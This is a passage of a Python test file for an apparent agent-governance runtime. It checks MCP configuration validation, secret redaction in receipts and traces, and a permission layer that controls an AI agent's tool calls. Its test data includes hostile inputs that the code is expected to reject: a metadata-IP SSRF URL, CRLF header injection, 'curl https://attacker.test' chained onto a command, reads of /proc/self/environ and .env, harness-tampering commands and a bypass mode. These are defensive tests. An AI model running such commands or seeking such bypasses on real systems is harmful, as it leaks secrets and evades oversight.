        allowed_network_domains=["${SEC_OPS_MCP_URL}"],
    )
    link_local_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://169.254.169.254/mcp",
        },
    )
    with pytest.raises(ValueError, match="forbidden IP address"):
        link_local_manager._load_mcp_clients(source)

    container_loopback_manager = AgentGovWorkspaceManager(
        business_agents_root=settings.business_agents_root,
        candidates_root=settings.candidates_root,
        workspaces_root=settings.workspaces_root,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://127.0.0.1:58001/mcp",
        },
        require_read_only_sources=True,
    )
    with pytest.raises(ValueError, match="cannot use a loopback"):
        container_loopback_manager._load_mcp_clients(source)

    container_plaintext_manager = AgentGovWorkspaceManager(
        business_agents_root=settings.business_agents_root,
        candidates_root=settings.candidates_root,
        workspaces_root=settings.workspaces_root,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://approved.internal/mcp",
        },
        require_read_only_sources=True,
    )
    with pytest.raises(ValueError, match="host.docker.internal"):
        container_plaintext_manager._load_mcp_clients(source)

    declaration = json.loads((source / "mcp/sec-ops.json").read_text(encoding="utf-8"))
    declaration["mcp_config"]["url"] = "http://approved.internal/mcp"
    declaration["credential_refs"] = [item for item in declaration["credential_refs"] if item["path"] != "mcp_config.url"]
    (source / "mcp/sec-ops.json").write_text(json.dumps(declaration), encoding="utf-8")
    literal_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://approved.internal/mcp",
        },
    )
    with pytest.raises(ValueError, match="Runtime environment reference"):
        literal_manager._load_mcp_clients(source)

    declaration["mcp_config"] = {
        "type": "http_mcp",
        "url": "${SEC_OPS_MCP_URL}",
        "headers": {"X-Leak": "${AGENTGOV_RUNTIME_SHARED_SECRET}"},
    }
    declaration["credential_refs"] = [
        {"env": "SEC_OPS_MCP_URL", "path": "mcp_config.url"},
        {"env": "AGENTGOV_RUNTIME_SHARED_SECRET", "path": "mcp_config.headers.X-Leak"},
    ]
    (source / "mcp/sec-ops.json").write_text(json.dumps(declaration), encoding="utf-8")
    cross_secret_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_URL": "http://approved.internal/mcp",
            "AGENTGOV_RUNTIME_SHARED_SECRET": "must-not-leak",
        },
    )
    with pytest.raises(ValueError, match="scoped to its server"):
        cross_secret_manager._load_mcp_clients(source)

    declaration["mcp_config"]["headers"] = {"Authorization": "Bearer ${SEC_OPS_MCP_TOKEN}"}
    declaration["credential_refs"] = [
        {"env": "SEC_OPS_MCP_URL", "path": "mcp_config.url"},
        {"env": "SEC_OPS_MCP_TOKEN", "path": "mcp_config.headers.Authorization"},
    ]
    (source / "mcp/sec-ops.json").write_text(json.dumps(declaration), encoding="utf-8")
    control_character_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_URL": "http://approved.internal/mcp",
            "SEC_OPS_MCP_TOKEN": "unsafe\r\nX-Leak: value",
        },
    )
    with pytest.raises(ValueError, match="visible ASCII"):
        control_character_manager._load_mcp_clients(source)


def test_workspace_manager_mcp_env_is_fail_closed_and_stdio_is_forbidden(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy-digest")
    (source / "mcp").mkdir()
    (source / "mcp/local.json").write_text(
        json.dumps(
            {
                "schema_version": 1,
                "name": "local",
                "credential_refs": [
                    {"env": "LOCAL_TOKEN", "path": "mcp_config.env.TOKEN"},
                ],
                "mcp_config": {
                    "type": "stdio_mcp",
                    "command": "/bin/false",
                    "env": {"TOKEN": "${LOCAL_TOKEN}"},
                },
                "enable_tools": [],
                "enable_resources": [],
                "enable_resource_templates": [],
            },
        ),
        encoding="utf-8",
    )
    _write_policy_manifest(source, allowed=[], denied=[])
    digest = harness_digest(source)
    manager = _manager(settings, environ={})
    workspace_id = f"candidate-soc-ops--v-{digest}"
    with pytest.raises(ValueError, match="LOCAL_TOKEN"):
        asyncio.run(manager.get_workspace("u", "a", "s", workspace_id))

    manager_with_env = _manager(settings, environ={"LOCAL_TOKEN": "secret"})
    with pytest.raises(ValueError, match="stdio_mcp is forbidden"):
        manager_with_env._load_mcp_clients(source)


def test_runtime_accepts_only_subagent_templates_registered_at_startup(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(
        settings.candidates_root,
        "candidate-change-1",
        "conversion-evidence-only",
        report=False,
    )
    worker = source / "subagents/worker"
    worker.mkdir(parents=True)
    (worker / "AGENT.md").write_text("Use {literal} evidence.\n", encoding="utf-8")
    (worker / "agent.yaml").write_text(
        json.dumps(
            {
                "agent": {"id": "worker", "description": "Evidence worker", "system_prompt": "AGENT.md"},
                "session": {"permission_mode": "default"},
                "workspace_policy": {
                    "fail_closed": True,
                    "immutable_harness": True,
                    "allowed_tools": [],
                    "denied_tools": [],
                },
            },
        ),
        encoding="utf-8",
    )
    digest = harness_digest(source)
    expected_type = f"agentgov-{digest}-worker"
    templates = load_subagent_templates(source, digest)
    assert list(templates) == [expected_type]
    manager = AgentGovWorkspaceManager(
        business_agents_root=settings.business_agents_root,
        candidates_root=settings.candidates_root,
        workspaces_root=settings.workspaces_root,
        subagent_templates=templates,
    )

    async def exercise() -> None:
        await manager.get_workspace("u", "runtime-agent", "session", f"candidate-change-1--v-{digest}")
        await manager.close_all()

    asyncio.run(exercise())
    assert templates[expected_type].description == "Evidence worker"
    assert templates[expected_type].system_prompt_template == "Use {{literal}} evidence.\n"

    late_source = _write_harness(
        settings.candidates_root,
        "candidate-change-2",
        "conversion-evidence-only",
        report=False,
    )
    late_worker = late_source / "subagents/late-worker"
    shutil.copytree(worker, late_worker)
    late_manifest = json.loads((late_worker / "agent.yaml").read_text())
    late_manifest["agent"]["id"] = "late-worker"
    (late_worker / "agent.yaml").write_text(json.dumps(late_manifest), encoding="utf-8")
    late_digest = harness_digest(late_source)
    with pytest.raises(RuntimeError, match="restart Runtime"):
        asyncio.run(
            manager.get_workspace(
                "u",
                "runtime-agent",
                "late-session",
                f"candidate-change-2--v-{late_digest}",
            ),
        )


def test_subagent_discovery_accepts_only_complete_immutable_snapshots(tmp_path: Path) -> None:
    root = tmp_path / "candidate-workspaces"
    root.mkdir()
    live = _write_harness(root, "candidate-live", "conversion-evidence-only", report=False)
    live_worker = live / "subagents" / "live-worker"
    live_worker.mkdir(parents=True)
    (live_worker / "AGENT.md").write_text("live\n", encoding="utf-8")
    (live_worker / "agent.yaml").write_text("agent: {id: live-worker}\n", encoding="utf-8")

    snapshot = root / ("published-" + "a" * 48)
    workspace = _write_harness(root, snapshot.name, "snapshot", report=False)
    worker = workspace / "subagents" / "worker"
    worker.mkdir(parents=True)
    (worker / "AGENT.md").write_text("Review evidence.\n", encoding="utf-8")
    (worker / "agent.yaml").write_text(
        json.dumps(
            {
                "agent": {"id": "worker", "description": "Reviewer", "system_prompt": "AGENT.md"},
                "session": {"permission_mode": "default"},
                "workspace_policy": {"fail_closed": True, "allowed_tools": [], "denied_tools": []},
            },
        ),
        encoding="utf-8",
    )
    digest = harness_digest(workspace)
    _write_published_marker(workspace, digest, agent_id="soc")

    candidate = root / ("candidate-" + "b" * 48)
    candidate_workspace = _write_harness(root, candidate.name, "candidate", report=False)
    candidate_worker = candidate_workspace / "subagents" / "candidate-worker"
    candidate_worker.mkdir(parents=True)
    (candidate_worker / "AGENT.md").write_text("Review candidate evidence.\n", encoding="utf-8")
    (candidate_worker / "agent.yaml").write_text(
        json.dumps(
            {
                "agent": {
                    "id": "candidate-worker",
                    "description": "Candidate reviewer",
                    "system_prompt": "AGENT.md",
                },
                "session": {"permission_mode": "default"},
                "workspace_policy": {"fail_closed": True, "allowed_tools": [], "denied_tools": []},
            },
        ),
        encoding="utf-8",
    )
    candidate_digest = harness_digest(candidate_workspace)
    _write_published_marker(candidate_workspace, candidate_digest, agent_id="soc")

    assert set(discover_subagent_templates(root)) == {
        f"agentgov-{digest}-worker",
        f"agentgov-{candidate_digest}-candidate-worker",
    }

    incomplete = root / ("candidate-" + "c" * 48)
    incomplete.mkdir()
    with pytest.raises(ValueError, match="incomplete"):
        discover_subagent_templates(root)


def test_receipt_middleware_posts_minimal_event_and_keeps_one_run_root_until_terminal_ack(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    requests: list[httpx.Request] = []
    posted: list[dict[str, object]] = []
    event = ReplyEndEvent(
        id="event-1",
        session_id="session-1",
        reply_id="reply-1",
        finished_reason=ReplyFinishedReason.COMPLETED,
    )

    async def handler(request: httpx.Request) -> httpx.Response:
        requests.append(request)
        timestamp = request.headers[TIMESTAMP_HEADER]
        expected = hmac.new(
            settings.shared_secret.encode(),
            (timestamp.encode() + b"\n" + request.method.encode() + b"\n" + request.url.path.encode() + b"\n" + request.content),
            hashlib.sha256,
        ).hexdigest()
        assert request.headers[SIGNATURE_HEADER] == expected
        if request.method == "GET":
            return httpx.Response(200, json=_runtime_context_payload())
        posted.append(json.loads(request.content))
        return _receipt_ack("run-1")

    receipt_middleware = AgentGovReceiptMiddleware(
        settings,
        transport=httpx.MockTransport(handler),
    )
    exporter = InMemorySpanExporter()
    provider = TracerProvider(id_generator=AgentGovTraceIdGenerator())
    provider.add_span_processor(RedactingSpanProcessor(SimpleSpanProcessor(exporter)))
    trace_registry = AgentGovRunTraceRegistry(provider.get_tracer("agentgov-runtime-test"))
    context_middleware = AgentGovTraceContextMiddleware(
        settings,
        transport=httpx.MockTransport(handler),
        trace_registry=trace_registry,
    )
    agent = SimpleNamespace(
        state=SimpleNamespace(session_id="session-1", reply_id="reply-1"),
    )
    observed_trace: list[tuple[str, bool]] = []

    async def next_handler(**_: object):
        span_context = otel_trace.get_current_span().get_span_context()
        observed_trace.append((f"{span_context.trace_id:032x}", span_context.is_remote))
        otel_trace.get_current_span().set_attribute("gen_ai.input.messages", "provider-test-secret")
        yield event

    async def with_receipt(**kwargs: object):
        async for item in receipt_middleware.on_reply(agent, kwargs, next_handler):
            yield item

    async def exercise() -> list[object]:
        return [
            item
            async for item in context_middleware.on_reply(
                agent,
                {"inputs": None},
                with_receipt,
            )
        ]

    assert asyncio.run(exercise()) == [event]
    assert observed_trace == [("1" * 32, False)]
    assert [request.method for request in requests] == ["GET", "POST"]
    assert requests[0].url.path == "/internal/runtime-context/session-1"
    assert requests[1].url.path == "/internal/runtime-receipts"
    assert posted == [
        {
            "event_id": "event-1",
            "payload": {"finished_reason": "completed"},
            "receipt_id": hashlib.sha256(b"run-1\nsession-1\nevent-1").hexdigest(),
            "reply_id": "reply-1",
            "run_id": "run-1",
            "session_id": "session-1",
            "trace_id": "1" * 32,
            "type": "REPLY_END",
        },
    ]
    stage_span = exporter.get_finished_spans()[0]
    assert stage_span.name == "agentgov.run.stage"
    assert stage_span.attributes["agentscope.agent.reply_id"] == "reply-1"
    secret = b"provider-test-secret"
    assert stage_span.attributes["agentgov.content.input.length"] == len(secret)
    assert (
        stage_span.attributes["agentgov.content.input.sha256"]
        == hashlib.sha256(
            secret,
        ).hexdigest()
    )
    assert "provider-test-secret" not in stage_span.to_json()

    trace_registry.finish_run(
        RuntimeContext.model_validate(_runtime_context_payload()),
        terminal_reason="completed",
        failed=False,
        runtime_version=settings.runtime_version,
        agentscope_version=str(stage_span.attributes["agentscope.runtime.version"]),
    )
    root_span = exporter.get_finished_spans()[1]
    assert root_span.name == "agentgov.run"
    assert root_span.parent is None
    assert f"{root_span.context.trace_id:032x}" == "1" * 32
    assert root_span.attributes["agentgov.agent.version_id"] == "version-1"
    assert root_span.attributes["agentgov.runtime.version"] == "dev"
    assert root_span.attributes["agentscope.agent.id"] == "runtime-agent-1"
    assert root_span.attributes["agentscope.runtime.version"]
    assert root_span.attributes["agentscope.session.id"] == "session-1"
    assert root_span.attributes["agentgov.run.finished_reason"] == "completed"
    assert "provider-test-secret" not in root_span.to_json()


def test_receipt_middleware_skips_text_deltas_but_posts_lifecycle_events(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    requests: list[httpx.Request] = []
    delta = TextBlockDeltaEvent(
        id="delta-1",
        reply_id="reply-1",
        block_id="block-1",
        delta="provider-test-secret",
    )
    end = ReplyEndEvent(
        id="end-1",
        session_id="session-1",
        reply_id="reply-1",
        finished_reason=ReplyFinishedReason.COMPLETED,
    )

    async def handler(request: httpx.Request) -> httpx.Response:
        requests.append(request)
        return _receipt_ack("run-1")

    middleware = AgentGovReceiptMiddleware(
        settings,
        transport=httpx.MockTransport(handler),
    )
    agent = SimpleNamespace(
        state=SimpleNamespace(session_id="session-1", reply_id="reply-1"),
    )

    async def next_handler(**_: object):
        yield delta
        yield end

    async def exercise() -> list[object]:
        token = CURRENT_RUNTIME_CONTEXT.set(
            RuntimeContext.model_validate(_runtime_context_payload()),
        )
        try:
            return [
                item
                async for item in middleware.on_reply(
                    agent,
                    {"inputs": None},
                    next_handler,
                )
            ]
        finally:
            CURRENT_RUNTIME_CONTEXT.reset(token)

    assert asyncio.run(exercise()) == [delta, end]
    assert len(requests) == 1
    assert requests[0].url.path == "/internal/runtime-receipts"
    assert json.loads(requests[0].content)["type"] == "REPLY_END"
    assert "provider-test-secret" not in requests[0].content.decode()


def test_storage_commits_message_before_stable_persisted_receipt_retry(tmp_path: Path) -> None:
    settings = replace(
        _settings(tmp_path),
        receipt_retry_attempts=2,
        receipt_retry_backoff_seconds=0.001,
    )
    settings.prepare_writable_directories()
    posts: list[dict[str, object]] = []

    async def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=_runtime_context_payload())
        posts.append(json.loads(request.content))
        return httpx.Response(503) if len(posts) == 1 else _receipt_ack("run-1")

    async def exercise():
        storage = ProvisionedAsyncSQLAlchemyStorage(
            settings,
            receipt_transport=httpx.MockTransport(handler),
        )
        async with storage:
            message = AssistantMsg(
                "Agent",
                "done",
                id="reply-1",
                finished_reason=ReplyFinishedReason.COMPLETED,
            )
            await storage.upsert_message(RUNTIME_USER_ID, "session-1", message)
            return await storage.get_message(RUNTIME_USER_ID, "session-1", "reply-1")

    stored = asyncio.run(exercise())
    assert stored is not None and stored.finished_reason is ReplyFinishedReason.COMPLETED
    assert len(posts) == 2 and posts[0] == posts[1]
    assert posts[0]["type"] == "MESSAGE_PERSISTED"
    assert posts[0]["reply_id"] == "reply-1"
    assert posts[0]["payload"] == {
        "error": None,
        "finished_reason": "completed",
        "message_id": "reply-1",
        "message_persisted": True,
        "trace_complete": False,
    }


def test_storage_keeps_terminal_receipt_pending_beyond_retry_log_window(
    tmp_path: Path,
) -> None:
    settings = replace(
        _settings(tmp_path),
        receipt_retry_attempts=2,
        receipt_retry_backoff_seconds=0.001,
    )
    settings.prepare_writable_directories()
    posts: list[dict[str, object]] = []

    async def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=_runtime_context_payload())
        posts.append(json.loads(request.content))
        if len(posts) <= settings.receipt_retry_attempts:
            return httpx.Response(503)
        return _receipt_ack("run-1")

    async def exercise() -> None:
        storage = ProvisionedAsyncSQLAlchemyStorage(
            settings,
            receipt_transport=httpx.MockTransport(handler),
        )
        async with storage:
            await storage.upsert_message(
                RUNTIME_USER_ID,
                "session-1",
                AssistantMsg(
                    "Agent",
                    "done",
                    id="reply-1",
                    finished_reason=ReplyFinishedReason.COMPLETED,
                ),
            )

    asyncio.run(exercise())
    assert len(posts) == settings.receipt_retry_attempts + 1
    assert posts[0] == posts[1] == posts[2]


def test_storage_response_loss_retries_identical_receipt_without_rebinding_run(tmp_path: Path) -> None:
    settings = replace(
        _settings(tmp_path),
        receipt_retry_attempts=2,
        receipt_retry_backoff_seconds=0.001,
    )
    settings.prepare_writable_directories()
    context_payload = {
        **_runtime_context_payload(),
        "run_id": "run-stable",
        "session_id": "session-stable",
        "root_session_id": "session-stable",
    }
    gets = 0
    posts: list[dict[str, object]] = []

    async def handler(request: httpx.Request) -> httpx.Response:
        nonlocal gets
        if request.method == "GET":
            gets += 1
            return httpx.Response(200, json=context_payload)
        posts.append(json.loads(request.content))
        if len(posts) == 1:
            raise httpx.ReadError("response lost after submit", request=request)
        return _receipt_ack("run-stable")

    async def exercise() -> None:
        storage = ProvisionedAsyncSQLAlchemyStorage(
            settings,
            receipt_transport=httpx.MockTransport(handler),
        )
        async with storage:
            await storage.upsert_message(
                RUNTIME_USER_ID,
                "session-stable",
                AssistantMsg(
                    "Agent",
                    "done",
                    id="reply-stable",
                    finished_reason=ReplyFinishedReason.COMPLETED,
                ),
            )

    asyncio.run(exercise())
    assert gets == 1
    assert len(posts) == 2 and posts[0] == posts[1]
    assert posts[0]["run_id"] == "run-stable"
    assert posts[0]["reply_id"] == "reply-stable"


def test_update_session_state_emits_one_multi_reply_batch_marker_after_messages(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    settings.prepare_writable_directories()
    posted: list[dict[str, object]] = []
    finished_traces: list[tuple[str, dict[str, object]]] = []
    closed_traces: list[bool] = []
    trace_registry = SimpleNamespace(
        finish_run=lambda runtime_context, **kwargs: finished_traces.append(
            (runtime_context.run_id, kwargs),
        ),
        close_all=lambda: closed_traces.append(True),
    )
    context = RuntimeContext.model_validate(
        {
            **_runtime_context_payload(),
            "session_id": "session-batch",
            "root_session_id": "session-batch",
            "run_id": "run-batch",
        },
    )

    async def committed_state(*_args, **_kwargs) -> None:
        return None

    async def handler(request: httpx.Request) -> httpx.Response:
        assert request.method == "POST"
        payload = json.loads(request.content)
        posted.append(payload)
        if payload["type"] == "SESSION_PERSISTED":
            return _receipt_ack("run-batch", status="succeeded", terminal_reason="completed")
        return _receipt_ack("run-batch")

    monkeypatch.setattr(AsyncSQLAlchemyStorage, "update_session_state", committed_state)

    async def exercise() -> None:
        storage = ProvisionedAsyncSQLAlchemyStorage(
            settings,
            receipt_transport=httpx.MockTransport(handler),
            trace_registry=trace_registry,  # type: ignore[arg-type]
        )
        async with storage:
            for reply_id in ("reply-a", "reply-b"):
                bind_reply_context(context, reply_id)
                await storage.upsert_message(
                    RUNTIME_USER_ID,
                    "session-batch",
                    AssistantMsg(
                        "Agent",
                        reply_id,
                        id=reply_id,
                        finished_reason=ReplyFinishedReason.COMPLETED,
                    ),
                )
            await storage.update_session_state(
                RUNTIME_USER_ID,
                "runtime-agent-1",
                "session-batch",
                AgentState(),
            )

    asyncio.run(exercise())
    by_type = {str(payload["type"]): payload for payload in posted if payload["type"] == "SESSION_PERSISTED"}
    assert len(posted) == 3
    assert [payload["reply_id"] for payload in posted if payload["type"] == "MESSAGE_PERSISTED"] == [
        "reply-a",
        "reply-b",
    ]
    assert by_type["SESSION_PERSISTED"]["reply_id"] is None
    assert by_type["SESSION_PERSISTED"]["payload"] == {
        "reply_ids": ["reply-a", "reply-b"],
        "message_count": 2,
        "team_generation": 0,
    }
    assert len(finished_traces) == 1
    finished_run_id, finish_kwargs = finished_traces[0]
    assert finished_run_id == "run-batch"
    assert finish_kwargs["terminal_reason"] == "completed"
    assert finish_kwargs["failed"] is False
    assert finish_kwargs["runtime_version"] == settings.runtime_version
    assert isinstance(finish_kwargs["agentscope_version"], str)
    assert closed_traces == [True]


def test_setup_failure_without_reply_middleware_emits_singleton_batch_marker(tmp_path: Path) -> None:
    settings = _settings(tmp_path)
    settings.prepare_writable_directories()
    posted: list[dict[str, object]] = []
    context_payload = {
        **_runtime_context_payload(),
        "session_id": "session-setup",
        "root_session_id": "session-setup",
        "run_id": "run-setup",
    }

    async def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=context_payload)
        payload = json.loads(request.content)
        posted.append(payload)
        if payload["type"] == "SESSION_PERSISTED":
            return _receipt_ack("run-setup", status="interrupted", terminal_reason="observation_incomplete")
        return _receipt_ack("run-setup", status="running")

    async def exercise() -> None:
        storage = ProvisionedAsyncSQLAlchemyStorage(
            settings,
            receipt_transport=httpx.MockTransport(handler),
        )
        async with storage:
            message = AssistantMsg(
                "Agent",
                "failed",
                id="reply-setup",
                finished_reason=ReplyFinishedReason.ERROR,
            )
            message.error = ErrorInfo(type=ErrorType.INTERNAL, message="assembly failed")
            await storage.upsert_message(RUNTIME_USER_ID, "session-setup", message)

    asyncio.run(exercise())
    assert [payload["type"] for payload in posted] == ["MESSAGE_PERSISTED", "SESSION_PERSISTED"]
    assert posted[1]["payload"] == {
        "reply_ids": ["reply-setup"],
        "message_count": 1,
        "team_generation": 0,
    }


def test_message_persisted_receipt_redacts_error_message(tmp_path: Path) -> None:
    context = RuntimeContext.model_validate(_runtime_context_payload())
    message = AssistantMsg(
        "Agent",
        "failed",
        id="reply-error",
        finished_reason=ReplyFinishedReason.ERROR,
    )
    message.error = ErrorInfo(type=ErrorType.INTERNAL, message="secret=provider-test-secret stack detail")

    receipt = ProvisionedAsyncSQLAlchemyStorage._message_receipt(context, message)

    assert receipt.payload["error"] == {"type": "internal"}
    assert "provider-test-secret" not in receipt.model_dump_json()


def test_policy_middleware_enforces_deny_allow_delegate_immutability_and_no_bypass(
    tmp_path: Path,
) -> None:
    workspace = tmp_path / "runtime-workspace"
    _write_policy_manifest(
        workspace,
        allowed=["Bash(date *)", "Bash(chmod *)", "Write(**)", "Read(**)", "Grep", "Glob", "WebFetch"],
        denied=["Bash(date --set *)", "mcp__sec-ops__delete*"],
    )
    (workspace / ".env").write_text("SECRET=value\n", encoding="utf-8")
    (workspace / ".mcp").write_text("MCP_TOKEN=secret\n", encoding="utf-8")
    middleware = AgentGovPolicyMiddleware(workspace)
    native_calls = 0

    async def native(**_: object) -> PermissionDecision:
        nonlocal native_calls
        native_calls += 1
        return PermissionDecision(PermissionBehavior.ASK, "native")

    async def decide(
        tool: object,
        tool_input: dict[str, object],
        mode: PermissionMode = PermissionMode.DEFAULT,
    ) -> PermissionDecision:
        agent = SimpleNamespace(
            state=SimpleNamespace(permission_context=PermissionContext(mode=mode)),
        )
        return await middleware.on_check_permission(
            agent,
            {"tool_call": object(), "tool": tool, "tool_input": tool_input},
            native,
        )

    def fake_mcp() -> ToolChunk:
        """测试 MCP 通配名称。"""

        raise AssertionError("permission test must not execute the tool")

    denied = asyncio.run(decide(Bash(), {"command": "date --set now"}))
    assert denied.behavior is PermissionBehavior.DENY
    allowed = asyncio.run(decide(Bash(), {"command": "date +%s"}))
    assert allowed.behavior is PermissionBehavior.ALLOW
    unmatched = asyncio.run(decide(Bash(), {"command": "pwd"}))
    assert unmatched.behavior is PermissionBehavior.DENY
    mcp_denied = asyncio.run(
        decide(
            FunctionTool(fake_mcp, name="mcp__sec-ops__delete_alert"),
            {},
        ),
    )
    assert mcp_denied.behavior is PermissionBehavior.DENY
    protected = asyncio.run(
        decide(
            Write(),
            {"file_path": str(workspace / "skills/unsafe/SKILL.md")},
        ),
    )
    assert protected.behavior is PermissionBehavior.DENY
    for command in ("chmod u+w agent.yaml", "printf bad > AGENT.md", "rm -rf skills/"):
        bash_mutation = asyncio.run(decide(Bash(), {"command": command}))
        assert bash_mutation.behavior is PermissionBehavior.DENY
    denied_read = asyncio.run(decide(Read(), {"file_path": str(workspace / ".env")}))
    assert denied_read.behavior is PermissionBehavior.DENY
    denied_mcp = asyncio.run(decide(Read(), {"file_path": str(workspace / ".mcp")}))
    assert denied_mcp.behavior is PermissionBehavior.DENY
    nested_mcp = asyncio.run(decide(Read(), {"file_path": str(workspace / "nested/.mcp")}))
    assert nested_mcp.behavior is PermissionBehavior.DENY
    grep_mcp = asyncio.run(decide(Grep(), {"pattern": "Authorization", "path": str(workspace), "glob": ".mcp"}))
    assert grep_mcp.behavior is PermissionBehavior.DENY
    glob_mcp = asyncio.run(decide(Glob(), {"pattern": "**/.mcp", "path": str(workspace)}))
    assert glob_mcp.behavior is PermissionBehavior.DENY
    denied_grep = asyncio.run(decide(Grep(), {"pattern": "SECRET", "path": str(workspace)}))
    assert denied_grep.behavior is PermissionBehavior.DENY
    denied_glob = asyncio.run(decide(Glob(), {"pattern": "**/.env", "path": str(workspace)}))
    assert denied_glob.behavior is PermissionBehavior.DENY
    proc_environment = asyncio.run(decide(Read(), {"file_path": "/proc/self/environ"}))
    assert proc_environment.behavior is PermissionBehavior.DENY
    cross_agent = asyncio.run(decide(Read(), {"file_path": str(tmp_path / "other-agent/AGENT.md")}))
    assert cross_agent.behavior is PermissionBehavior.DENY
    shell_escape = asyncio.run(decide(Bash(), {"command": "date +%s; curl https://attacker.test"}))
    assert shell_escape.behavior is PermissionBehavior.DENY
    jq_file_read = asyncio.run(decide(Bash(), {"command": "jq -R . /proc/self/environ"}))
    assert jq_file_read.behavior is PermissionBehavior.DENY
    web_fetch = asyncio.run(
        decide(
            FunctionTool(fake_mcp, name="WebFetch"),
            {"url": "https://attacker.test/secret"},
        ),
    )
    assert web_fetch.behavior is PermissionBehavior.DENY
    bypass = asyncio.run(
        decide(Bash(), {"command": "date +%s"}, PermissionMode.BYPASS),
    )
    assert bypass.behavior is PermissionBehavior.DENY
    assert native_calls == 0


def test_policy_middleware_rejects_mcp_wildcard_and_denies_new_server_tool(tmp_path: Path) -> None:
    workspace = tmp_path / "runtime-workspace"
    _write_policy_manifest(
        workspace,
        allowed=["mcp__sec-ops__soc_api__list_alerts"],
        denied=[],
    )
    middleware = AgentGovPolicyMiddleware(workspace)

    def fake_mcp() -> ToolChunk:
        raise AssertionError("permission test must not execute the tool")

    async def decide(name: str) -> PermissionDecision:
        agent = SimpleNamespace(
            state=SimpleNamespace(permission_context=PermissionContext(mode=PermissionMode.DEFAULT)),
        )

        async def native(**_: object) -> PermissionDecision:
            return PermissionDecision(PermissionBehavior.ASK, "native")

        return await middleware.on_check_permission(
            agent,
            {
                "tool_call": object(),
                "tool": FunctionTool(fake_mcp, name=name),
                "tool_input": {},
            },
            native,
        )

    assert asyncio.run(decide("mcp__sec-ops__soc_api__list_alerts")).behavior is PermissionBehavior.ALLOW
    assert asyncio.run(decide("mcp__sec-ops__soc_api__quarantine_host")).behavior is PermissionBehavior.DENY

    _write_policy_manifest(workspace, allowed=["mcp__sec-ops__*"], denied=[])
    with pytest.raises(ValueError, match="cannot wildcard MCP"):
        AgentGovPolicyMiddleware(workspace)

    _write_policy_manifest(
        workspace,
        allowed=["Bash(*)"],
        denied=[],
        permission_mode="bypass",
    )
    with pytest.raises(ValueError, match="bypass"):
        AgentGovPolicyMiddleware(workspace)


def test_policy_middleware_keeps_current_run_rules_across_hitl_replies_and_prunes_stale_rules(tmp_path: Path) -> None:
    workspace = tmp_path / "runtime-workspace"
    _write_policy_manifest(workspace, allowed=[], denied=[])
    middleware = AgentGovPolicyMiddleware(workspace)
    normal = PermissionRule(tool_name="Read", rule_content="public/**", behavior="allow", source="agent.yaml")
    current = PermissionRule(tool_name="Read", rule_content="reports/**", behavior="allow", source="agentgov-run:run-1")
    stale = PermissionRule(tool_name="Read", rule_content="other/**", behavior="allow", source="agentgov-run:run-old")
    permission_context = PermissionContext(
        mode=PermissionMode.DEFAULT,
        allow_rules={"Read": [normal, current, stale]},
    )
    agent = SimpleNamespace(state=SimpleNamespace(permission_context=permission_context))
    context = RuntimeContext(**_runtime_context_payload())

    async def native(**_: object) -> PermissionDecision:
        return PermissionDecision(PermissionBehavior.ASK, "native")

    token = CURRENT_RUNTIME_CONTEXT.set(context)
    try:
        decision = asyncio.run(
            middleware.on_check_permission(
                agent,
                {"tool_call": object(), "tool": Read(), "tool_input": {"file_path": "reports/current.txt"}},
                native,
            ),
        )
    finally:
        CURRENT_RUNTIME_CONTEXT.reset(token)
    assert decision.behavior is PermissionBehavior.ALLOW
    assert [rule.source for rule in permission_context.allow_rules["Read"]] == ["agent.yaml", "agentgov-run:run-1"]

    permission_context.allow_rules["Read"].append(stale)

    async def reply_handler(**_: object):
        yield SimpleNamespace(type="REPLY_END")

    async def consume_reply(active_context: RuntimeContext | None) -> None:
        token = CURRENT_RUNTIME_CONTEXT.set(active_context)
        try:
            async for _ in middleware.on_reply(agent, {"inputs": None}, reply_handler):
                pass
        finally:
            CURRENT_RUNTIME_CONTEXT.reset(token)

    asyncio.run(consume_reply(context))
    assert [rule.source for rule in permission_context.allow_rules["Read"]] == [
        "agent.yaml",
        "agentgov-run:run-1",
    ]

    next_context = context.model_copy(update={"run_id": "run-2"})
    asyncio.run(consume_reply(next_context))
    assert [rule.source for rule in permission_context.allow_rules["Read"]] == ["agent.yaml"]


def test_policy_middleware_restricts_agentcreate_to_current_harness_templates(tmp_path: Path) -> None:
    workspace = tmp_path / "runtime-workspace"
    _write_policy_manifest(workspace, allowed=["AgentCreate"], denied=[])
    subagent = workspace / "subagents" / "reviewer"
    subagent.mkdir(parents=True)
    (subagent / "agent.yaml").write_text("agent:\n  id: reviewer\n", encoding="utf-8")
    (subagent / "AGENT.md").write_text("review evidence\n", encoding="utf-8")
    digest = harness_digest(workspace)
    middleware = AgentGovPolicyMiddleware(workspace)

    def agent_create() -> ToolChunk:
        raise AssertionError("permission test must not execute the tool")

    tool = FunctionTool(agent_create, name="AgentCreate")
    agent = SimpleNamespace(state=SimpleNamespace(permission_context=PermissionContext(mode=PermissionMode.DEFAULT)))

    async def native(**_: object) -> PermissionDecision:
        raise AssertionError("AgentGov policy must remain fail-closed")

    async def decide(subagent_type: str) -> PermissionDecision:
        return await middleware.on_check_permission(
            agent,
            {"tool_call": object(), "tool": tool, "tool_input": {"subagent_type": subagent_type}},
            native,
        )

    allowed = asyncio.run(decide(f"agentgov-{digest}-reviewer"))
    cross_harness = asyncio.run(decide(f"agentgov-{'f' * 64}-reviewer"))
